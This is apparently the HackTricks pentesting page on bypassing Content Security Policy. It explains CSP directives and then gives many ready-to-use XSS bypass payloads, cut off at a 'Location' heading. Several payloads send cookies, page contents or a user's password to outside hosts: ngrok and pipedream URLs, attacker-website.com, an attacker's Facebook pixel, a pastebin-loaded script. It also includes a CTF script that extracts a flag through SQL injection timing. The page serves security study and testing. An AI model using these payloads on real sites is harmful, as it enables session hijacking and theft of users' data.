
##
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/content-security-policy-csp-bypass/README.md
#
##

# Content Security Policy (CSP) Bypass

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## What is CSP

Content Security Policy or CSP is a built-in browser technology which **helps protect from attacks such as cross-site scripting (XSS)**. It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more. Here is an example of resources being allowed from the local domain (self) to be loaded and executed in-line and allow string code executing functions like `eval`, `setTimeout` or `setInterval:`

Content Security Policy is implemented via **response headers** or **meta elements of the HTML page**. The browser follows the received policy and actively blocks violations as they are detected.

Implemented via response header:

```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

Implemented via meta tag:

```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

### Headers

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` This one won't block anything, only send reports (use in Pre environment).

## Defining resources

CSP works by restricting the origins from where active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of `eval()`.

```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

### Directives

* **script-src**: This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.
* **default-src**: This directive defines the policy for fetching resources by default. When fetch directives are absent in the CSP header the browser follows this directive by default.
* **Child-src**: This directive defines allowed resources for web workers and embedded frame contents.
* **connect-src**: This directive restricts URLs to load using interfaces like fetch, websocket, XMLHttpRequest
* **frame-src**: This directive restricts URLs to frames that can be called out.
* **frame-ancestors**: This directive specifies the sources that can embed the current page. This directive applies to [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), or [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet). This directive can't be used in tags and applies only to non-HTML resources.
* **img-src**: It defines allowed sources to load images on the web page.
* **font-src:** directive specifies valid sources for fonts loaded using `@font-face`.
* **manifest-src**: This directive defines allowed sources of application manifest files.
* **media-src**: It defines allowed sources from where media objects can be loaded.
* **object-src**: It defines allowed sources for the \<object>, \<embed>, and \<applet> elements elements.
* **base-uri**: It defines allowed URLs which can be loaded using an element.
* **form-action**: This directive lists valid endpoints for submission from tags.
* **plugin-types**: It defines limits on the kinds of mime types a page may invoke.
* **upgrade-insecure-requests**: This directive instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URLs that need to be rewritten.
* **sandbox**: sandbox directive enables a sandbox for the requested resource similar to the sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.

### **Sources**

* \*: This allows any URL except `data:` , `blob:` , `filesystem:` schemes
* **self**: This source defines that loading of resources on the page is allowed from the same domain.
* **data**: This source allows loading resources via the data scheme (eg Base64 encoded images)
* **none**: This directive allows nothing to be loaded from any source.
* **unsafe-eval**: This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason, it is named unsafe.
* **unsafe-hashes**: This allows to enable of specific inline event handlers.
* **unsafe-inline**: This allows the use of inline resources, such as inline elements, javascript: URLs, inline event handlers, and inline elements. Again this is not recommended for security reasons.
* **nonce**: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
* **sha256-\<hash>**: Whitelist scripts with an specific sha256 hash
* **strict-dynamic**: It allows the browser to load and execute new JavaScript tags in the DOM from any script source that has previously been whitelisted by a "nonce" or "hash" value.
* **host**: Indicate a host such as example.com

## Unsafe CSP Rules

### 'unsafe-inline'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
```

Working payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval'; 
```

Working payload:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### strict-dynamic

If you can somehow make an **allowed JS code created a new script tag** in the DOM with your JS code, because an allowed script is creating it, the **new script tag will be allowed to be executed**.

### Wildcard (\*)

```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *; 
```

Working payload:

```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

### Lack of object-src and default-src

{% hint style="danger" %}
**It looks like this is not longer working**
{% endhint %}

```yaml
Content-Security-Policy: script-src 'self' ;
```

Working payloads:

```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

### File Upload + 'self'

```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ; 
```

If you can upload a JS file you can bypass this CSP:

Working payload:

```markup
"/>'><script src="/uploads/picture.png.js"></script>
```

However, it's highly probable that the server is **validating the uploaded file** and will only allow you to **upload determined type of files**.

Moreover, even if you could upload a **JS code inside** a file using an extension accepted by the server (like: _script.png_) this won't be enough because some servers like apache server **select MIME type of the file based on the extension** and browsers like Chrome will **reject to execute Javascript** code inside something that should be an image. "Hopefully", there are mistakes. For example, from a CTF I learnt that **Apache doesn't know** the _**.wave**_ extension, therefore it doesn't serve it with a **MIME type like audio/\***.

From here, if you find a XSS and a file upload, and you manage to find a **misinterpreted extension**, you could try to upload a file with that extension and the Content of the script. Or, if the server is checking the correct format of the uploaded file, create a polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Third Party Endpoints + ('unsafe-eval')

{% hint style="warning" %}
For some of the following payload **`unsafe-eval` is not even needed**.
{% endhint %}

```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
```

Load a vulnerable version of angular and execute arbitrary JS:

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
  </script>
  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
The post shows that you could **load** all **libraries** from `cdn.cloudflare.com` (or any other allowed JS libraries repo), execute all added functions from each library, and check **which functions from which libraries return the `window` object**.
{% endhint %}

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
 {{[].empty.call().alert([].empty.call().document.domain)}}
 {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].erase.call().alert('xss')}}
</div>
 
 

```

#### Abusing google recaptcha JS code

According to [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) you can abuse [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) inside a CSP to execute arbitrary JS code bypassing the CSP:

```html
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

### Third Party Endpoints + JSONP

```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

Scenarios like this where `script-src` is set to `self` and a particular domain which is whitelisted can be bypassed using JSONP. JSONP endpoints allow insecure callback methods which allow an attacker to perform XSS, working payload:

```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

[**JSONBee**](https://github.com/zigoo0/JSONBee) **contains ready to use JSONP endpoints to CSP bypass of different websites.**

The same vulnerability will occur if the **trusted endpoint contains an Open Redirect** because if the initial endpoint is trusted, redirects are trusted.

### Third Party Abuses
As described in the [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), there are many third party domains, that might be allowed somewhere in the CSP, can be abused to either exfiltrate data or execute JavaScript code. Some of these third-parties are:

| Entity | Allowed Domain | Capabilities |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Exfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Exfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Exec |
| Amazon CloudFront | *.cloudfront.net | Exfil, Exec |
| Amazon AWS | *.amazonaws.com | Exfil, Exec |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku	| *.herokuapp.com | Exfil, Exec |
| Google Firebase | *.firebaseapp.com | Exfil, Exec |

If you find any of the allowed domains in the CSP of your target, chances are that you might be able to bypass the CSP by registering on the third-party service and, either exfiltrate data to that service or to execute code.

For example, if you find the following CSP:

```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```

or 

```
Content-Security-Policy​: connect-src www.facebook.com;​
```

You should be able to exfiltrate data, similarly as it has always be done with [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). In this case, you follow these general steps:

1. Create a Facebook Developer account here.
1. Create a new "Facebook Login" app and select "Website".
1. Go to "Settings -> Basic" and get your "App ID"
1. In the target site you want to exfiltrate data from, you can exfiltrate data by directly using the Facebook SDK gadget "fbq" through a "customEvent" and the data payload.
1. Go to your App "Event Manager" and select the application you created (note the event manager could be found in an URL similar to this: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
1. Select the tab "Test Events" to see the events being sent out by "your" web site.

Then, on the victim side, you execute the following code to initialize the Facebook tracking pixel to point to the attacker's Facebook developer account app-id and issue a custom event like this:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
    data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```

As for the other seven third-party domains specified in the previous table, there are many other ways you can abuse them. Refer to the previously [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) for additional explanations about other third-party abuses.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

In addition to the aforementioned redirection to bypass path restrictions, there is another technique called Relative Path Overwrite (RPO) that can be used on some servers.

For example, if CSP allows the path `https://example.com/scripts/react/`, it can be bypassed as follows:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

The browser will ultimately load `https://example.com/scripts/angular/angular.js`.

This works because for the browser, you are loading a file named `..%2fangular%2fangular.js` located under `https://example.com/scripts/react/`, which is compliant with CSP.

However, for certain servers, when receiving the request, they will decode it, effectively requesting `https://example.com/scripts/react/../angular/angular.js`, which is equivalent to `https://example.com/scripts/angular/angular.js`.

By **exploiting this inconsistency in URL interpretation between the browser and the server, the path rules can be bypassed**.

The solution is to not treat `%2f` as `/` on the server-side, ensuring consistent interpretation between the browser and the server to avoid this issue.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### missing **base-uri**

If the **base-uri** directive is missing you can abuse it to perform a [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Moreover, if the **page is loading a script using a relative path** (like  `<script src="/js/app.js">`) using a **Nonce**, you can abuse the **base** **tag** to make it **load** the script from **your own server achieving a XSS.**\
If the vulnerable page is loaded with **httpS**, make use an httpS url in the base.

```html
<base href="https://www.attacker.com/">
```

### AngularJS events

Depending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead. When inside an event, AngularJS defines a special `$event` object, which simply references the browser event object. You can use this object to perform a CSP bypass. On Chrome, there is a special property on the `$event/event` object called `path`. This property contains an array of objects that causes the event to be executed. The last property is always the `window` object, which we can use to perform a sandbox escape. By passing this array to the `orderBy` filter, we can enumerate the array and use the last element (the `window` object) to execute a global function, such as `alert()`. The following code demonstrates this:

```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

**Find other Angular bypasses in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS and whitelisted domain

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```

If the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable classes. For more details visit this awesome [git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) repo.

Working payloads:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

Other JSONP arbitrary execution endpoints can be found in [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (some of them were deleted or fixed)

### Bypass via Redirection

What happens when CSP encounters server-side redirection? If the redirection leads to a different origin that is not allowed, it will still fail.

However, according to the description in [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), if the redirection leads to a different path, it can bypass the original restrictions.

Here's an example:

```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
  <div id=userContent>
    <script src="https://https://www.google.com/test"></script>
    <script src="https://https://www.google.com/a/test"></script>
    <script src="http://localhost:5555/301"></script>
  </div>
</body>
</html>
```

If CSP is set to `https://www.google.com/a/b/c/d`, since the path is considered, both `/test` and `/a/test` scripts will be blocked by CSP.

However, the final `http://localhost:5555/301` will be **redirected on the server-side to `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Since it is a redirection, the **path is not considered**, and the **script can be loaded**, thus bypassing the path restriction.

With this redirection, even if the path is specified completely, it will still be bypassed.

Therefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.

### Bypass CSP with dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS

```
default-src 'self' 'unsafe-inline'; img-src *;
```

`'unsafe-inline'` means that you can execute any script inside the code (XSS can execute code) and `img-src *` means that you can use in the webpage any image from any resource.

You can bypass this CSP by exfiltrating the data via images (in this occasion the XSS abuses a CSRF where a page accessible by the bot contains an SQLi, and extract the flag via an image):

```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

You could also abuse this configuration to **load javascript code inserted inside an image**. If for example, the page allows loading images from Twitter. You could **craft** an **special image**, **upload** it to Twitter and abuse the "**unsafe-inline**" to **execute** a JS code (as a regular XSS) that will **load** the **image**, **extract** the **JS** from it and **execute** **it**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### With Service Workers

Service workers **`importScripts`** function isn't limited by CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Policy Injection

**Research:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

If a **parameter** sent by you is being **pasted inside** the **declaration** of the **policy,** then you could **alter** the **policy** in some way that makes **it useless**. You could **allow script 'unsafe-inline'** with any of these bypasses:

```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Because this directive will **overwrite existing script-src directives**.\
You can find an example here: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

In Edge is much simpler. If you can add in the CSP just this: **`;_`** **Edge** would **drop** the entire **policy**.\
Example: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Time attack

Notice the lack of the directive `'unsafe-inline'`\
This time you can make the victim **load** a page in **your control** via **XSS** with a `<iframe`. This time you are going to make the victim access the page from where you want to extract information (**CSRF**). You cannot access the content of the page, but if somehow you can **control the time the page needs to load** you can extract the information you need.

This time a **flag** is going to be extracted, whenever a **char is correctly guessed** via SQLi the **response** takes **more time** due to the sleep function. Then, you will be able to extract the flag:

```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
	x = escape(x.replace(/_/g, '\\_'));
	return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`; 
}

function gen2(x) {
	x = escape(x);
	return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) { 
	let h = performance.now();
	f.location = (end ? gen2(word) : gen(word));
	await new Promise(r => {
		g.onload = r; 
	});
	let diff = performance.now() - h;
	return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
	let prefix = 'nn9ed{';
	while (true) {
		let i = 0;
		for (i;i<alphabet.length;i++) {
			let c = alphabet[i];
			let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
			console.log(prefix, c, t);
			if (t) {
				console.log('FOUND!')
				prefix += c;
				break;
			}
		}
		if (i==alphabet.length) {
			console.log('missing chars');
			break;
		}
		let t = await query(prefix+'}', true);
		if (t) {
			prefix += '}';
			break;
		}
	}
	new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
	console.log(prefix);
}

run();
</script>
```

### Via Bookmarklets

This attack would imply some social engineering where the attacker **convinces the user to drag and drop a link over the bookmarklet of the browser**. This bookmarklet would contain **malicious javascript** code that when drag\&dropped or clicked would be executed in the context of the current web window, **bypassing CSP and allowing to steal sensitive information** such as cookies or tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

You can **restrict a CSP of an Iframe** with the **`csp`** attribute:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), it was possible via **HTML injection** to **restrict** more a **CSP** so a script preventing CSTI was disabled and therefore the **vulnerability became exploitable.**\
CSP can be made more restrictive using **HTML meta tags** and inline scripts can disabled **removing** the **entry** allowing their **nonce** and **enable specific inline script via sha**:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```

### JS exfiltration with Content-Security-Policy-Report-Only

If you can manage to make the server responds with the header **`Content-Security-Policy-Report-Only`** with a **value controlled by you** (maybe because of a CRLF), you could make it point your server and if you **wraps** the **JS content** you want to exfiltrate with **`<script>`** and because highly probable `unsafe-inline` isn't allowed by the CSP, this will **trigger a CSP error** and part of the script (containing the sensitive info) will be sent to the server from `Content-Security-Policy-Report-Only`.

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)

```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

### Leaking Information CSP + Iframe

Imagine a situation where a **page is redirecting** to a different **page with a secret depending** on the **user**. For example, the user **admin** accessing **redirectme.domain1.com** is redirected to **adminsecret321.domain2.com** and you can cause an XSS to the admin.\
**Also pages that are redirected aren't allowed by the security policy, but the page that redirects is.**

You can leak the domain where the admin is redirected through:

* **through CSP violation**
* **through CSP rules.**

The CSP violation is an instant leak. All that needs to be done is to load an iframe pointing to `https://redirectme.domain1.com` and listen to `securitypolicyviolation` event which contains `blockedURI` property containing the domain of the blocked URI. That is because the `https://redirectme.domain1.com` (allowed by CSP) redirects to `https://adminsecret321.domain2.com` (**blocked by CSP**). This makes use of undefined behavior of how to handle iframes with CSP. Chrome and Firefox behave differently regarding this.

When you know the characters that may compose the secret subdomain, you can also use a binary search and check when the CSP blocked the resource and when not creating different forbidden domains in the CSP (in this case the secret can be in the form doc-X-XXXX.secdrivencontent.dev)

```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

Trick from [**here**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Unsafe Technologies to Bypass CSP

### PHP response buffer overload

PHP is known for **buffering the response to 4096** bytes by default. Therefore, if PHP is showing a warning, by providing **enough data inside warnings**, the **response** will be **sent** **before** the **CSP header**, causing the header to be ignored.\
Then, the technique consists basically in **filling the response buffer with warnings** so the CSP header isn't sent.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Rewrite Error Page

From [**this writeup**](https://blog.ssrf.kr/69) it looks like it was possible to bypass a CSP protection by loading an error page (potentially without CSP) and rewriting its content.

```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
    a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

### SOME + 'self' + wordpress

SOME is a technique that abuses an XSS (or highly limited XSS) **in an endpoint of a page** to **abuse** **other endpoints of the same origin.** This is done by loading the vulnerable endpoint from an attacker page and then refreshing the attacker page to the real endpoint in the same origin you want to abuse. This way the **vulnerable endpoint** can use the **`opener`** object in the **payload** to **access the DOM** of the **real endpoint to abuse**. For more information check:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Moreover, **wordpress** has a **JSONP** endpoint in `/wp-json/wp/v2/users/1?_jsonp=data` that will **reflect** the **data** sent in the output (with the limitation of only letter, numbers and dots).

An attacker can abuse that endpoint to **generate a SOME attack** against WordPress and **embed** it inside `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note that this **script** will be **loaded** because it's **allowed by 'self'**. Moreover, and because WordPress is installed, an attacker might abuse the **SOME attack** through the **vulnerable** **callback** endpoint that **bypasses the CSP** to give more privileges to a user, install a new plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

If there is a strict CSP that doesn't allow you to **interact with external servers**, there are some things you can always do to exfiltrate the information.

### Location

